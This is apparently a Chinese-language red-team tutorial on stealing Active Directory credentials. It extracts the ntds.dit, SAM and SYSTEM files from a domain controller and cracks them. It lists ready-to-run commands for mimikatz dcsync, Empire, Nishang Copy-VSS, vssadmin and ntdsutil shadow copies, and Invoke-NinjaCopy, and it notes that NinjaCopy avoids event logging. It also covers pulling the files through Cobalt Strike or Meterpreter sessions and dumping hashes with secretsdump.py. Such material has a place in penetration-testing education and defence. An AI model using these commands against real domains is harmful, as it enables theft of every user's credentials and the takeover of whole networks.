## ntds.dit文件的获取与解密

ntds.dit文件是域环境中域控上会有的一个文件，这个文件存储着域内所有用户的凭据信息([hash](https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020))。非域环境也就是在工作组环境中，有一个sam文件存储着当前主机用户的密码信息,想要破解sam文件与ntds.dit文件都需要拥有一个system文件。

~~~bash
ntds.dit文件位置: C:\Windows\NTDS\NTDS.dit
system文件位置:C:\Windows\System32\config\SYSTEM
sam文件位置:C:\Windows\System32\config\SAM
~~~

### ntds.dit部分

#### 在线破解

##### Mimikatz

所谓的在线破解就是不用将域控上的ntds.dit文件下载下来，直接在已有的shell上破解。比如说你有一个cs弹回的beacon，就可以在beacon中直接利用mimikatz来破解，**这一切的前提是有管理员权限。**

> Mimikatz有一个功能（dcsync），它可以利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。
>
> 可以通过dcsync直接获取test域内所有用户hash
> lsadump::dcsync /domain:test.com /all /csv

[![bIgAdf.png](https://s1.ax1x.com/2022/03/11/bIgAdf.png)](https://imgtu.com/i/bIgAdf)

> 可以查看所有用户的所有详细信息
> lsadump::lsa /inject

##### Empire

PowerShell Empire有两个模块可以通过DCSync攻击获取域哈希。这两个模块都需要有域管理员权限，并且它们都使用微软的复制服务。模块依靠**Invoke-Mimikatz** PowerShell脚本来执行与DCSync相关的Mimikatz命令。以下模块将域哈希提取为类似于Metasploit **hashdump**命令输出的格式。

~~~
usemodule credentials/mimikatz/dcsync_hashdump
~~~

##### Nishang

[Nishang](https://github.com/samratashok/nishang)是一个PowerShell框架，它使红队和渗透测试人员可以对系统执行攻击性操作。其中[VSS](https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1)脚本可以用于自动提取所需的文件：NTDS.DIT，SAM和系统。这些文件将解压缩到当前工作目录或任何其他指定的文件夹中。

~~~
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\
~~~

[![bIb42t.png](https://s1.ax1x.com/2022/03/11/bIb42t.png)](https://imgtu.com/i/bIb42t)

另外，可以通过加载PowerShell扩展程序从现有的Meterpreter会话中执行脚本。

```
load powershell
powershell_import /root/Copy-VSS.ps1
powershell_execute Copy-VSS
```

[![bIbxx0.png](https://s1.ax1x.com/2022/03/11/bIbxx0.png)](https://imgtu.com/i/bIbxx0)

一旦脚本导入到现有的Meterpreter会话中，也可以使用命令**powershell_shell**建立直接的PowerShell会话来提取文件。

```
Copy-VSS
Copy-VSS -DestinationDir C:\Ninja
```

[![bIbjGn.png](https://s1.ax1x.com/2022/03/11/bIbjGn.png)](https://imgtu.com/i/bIbjGn)













#### 离线破解

离线破解一般需要两步，首先就是将远端域控的ntds.dit下载到本地，然后利用再在本地进行破解。ntds.dit文件一直在被windows系统使用，所以常规的复制下载方法是无法将文件下载到本地的，这里我推荐如下几个方法

##### 获取ntds.dit文件的方式

###### vssadmin进行复制ntds文件

创建卷影列表

~~~
vssadmin create shadow /for=C:
~~~

获取NDTS.dit和SYSTEM

~~~
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy\
~~~

删除卷影列表

~~~
vssadmin Delete Shadows /For=C:
~~~





执行完上述命令即可将ntds.dit复制到C盘下创建的ShadowCopy中。执行结果如下图所示
[![bIW7tK.png](https://s1.ax1x.com/2022/03/11/bIW7tK.png)](https://imgtu.com/i/bIW7tK)

[![bIWL1e.png](https://s1.ax1x.com/2022/03/11/bIWL1e.png)](https://imgtu.com/i/bIWL1e)

> 也可以使用这个命令复制sam或者system文件：
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hiv
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hiv

###### 使用ntdsutil快照

查看当前快照列表

~~~
C:\Users\Administrator>ntdsutil snapshot "list all" quit quit
ntdsutil: snapshot
快照: list all
找不到快照。
快照: quit
ntdsutil: quit
~~~

创建快照

~~~
C:\Users\Administrator>ntdsutil snapshot "activate instance ntds" create quit quit
ntdsutil: snapshot
快照: activate instance ntds
活动实例设置为“ntds”。
快照: create
正在创建快照...
成功生成快照集 {550f5e34-1952-475b-99ef-30ba80014363}。
快照: quit
ntdsutil
~~~

**注：其中快照的guid需要取出来，挂载快照时使用**

挂载快照

~~~
C:\Users\Administrator>ntdsutil snapshot "mount {550f5e34-1952-475b-99ef-30ba80014363}" quit quit
ntdsutil: snapshot
快照: mount {550f5e34-1952-475b-99ef-30ba80014363}
快照 {b38c1255-073f-4124-a32f-75144555c3fd} 已作为 C:\$SNAP_201810172200_VOLUMEC$\ 装载
快照: quit
ntdsutil: quit
~~~

注：机器中有几块硬盘，那么就会生成几个快照分区，快照分区会以`$SNAP_时间_VOLUME{分区名}$`进行命名

[![bITYHH.png](https://s1.ax1x.com/2022/03/11/bITYHH.png)](https://imgtu.com/i/bITYHH)





或者你可以直接

[![bIfuNV.png](https://s1.ax1x.com/2022/03/11/bIfuNV.png)](https://imgtu.com/i/bIfuNV)

依次在命令行输入以下命令即可

~~~
Ntdsutil "activate instance ntds" Ifm "create full C:\ntdsutil" Quit quit
~~~

最终会在c盘下生成ntdsutil这个文件夹：

[![bIfgEt.png](https://s1.ax1x.com/2022/03/11/bIfgEt.png)](https://imgtu.com/i/bIfgEt)

这个文件夹里面存有system文件与ntds.dit文件。

###### 通过NinjaCopy获得域控服务器NTDS.dit文件

ninjacopy下载地址:https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1

~~~
Import-Module -name .\Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\ntds.dit"
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "c:\system.hiv"
~~~

执行结果如下

[![bIfh8S.png](https://s1.ax1x.com/2022/03/11/bIfh8S.png)](https://imgtu.com/i/bIfh8S)

这种方法没有调用Volume Shadow Copy服务，所以不会产生日志文件7036


##### 文件移动

这里假设我们拿到了CS的一个shell，我们可以直接下载对方的ntds.dit和system等内容

[![bIh8G8.png](https://s1.ax1x.com/2022/03/11/bIh8G8.png)](https://imgtu.com/i/bIh8G8)

##### 本地破解

当把文件下载到本地后，就需要开始破解其中的密码了，这时候我们采用impacket的secretsdump.py这个脚本。
命令为：

~~~python
python secretsdump.py -ntds ~/Desktop/ntds.dit -system ~/Desktop/system.hiv LOCAL
~~~

[![bIhcM4.png](https://s1.ax1x.com/2022/03/11/bIhcM4.png)](https://imgtu.com/i/bIhcM4)



DC中有一个特殊用户叫做:krbtgt,它是一个无法登录的账户,是在创建域时系统自动创建的,在整个kerberos认证中会多次用到它的Hash值去做验证

破解出的密码格式为domain\uid:rid:lmhash:nthash，例如krbtgt的密码要采用最后一个冒号后面的那个，也就是d8d2ad开头的

















